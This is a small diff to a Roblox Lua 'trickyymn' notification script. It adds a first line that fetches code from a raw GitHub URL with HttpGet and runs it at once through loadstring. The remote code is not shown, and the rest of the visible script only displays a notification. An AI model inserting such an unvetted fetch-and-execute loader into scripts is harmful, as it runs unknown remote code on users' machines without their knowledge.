@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lol9182828/Dances-lol/refs/heads/main/Lol"))()
 --trickyymn Notification
 game:GetService("StarterGui"):SetCore("SendNotification", { 
 	Title = "trickyymn script";
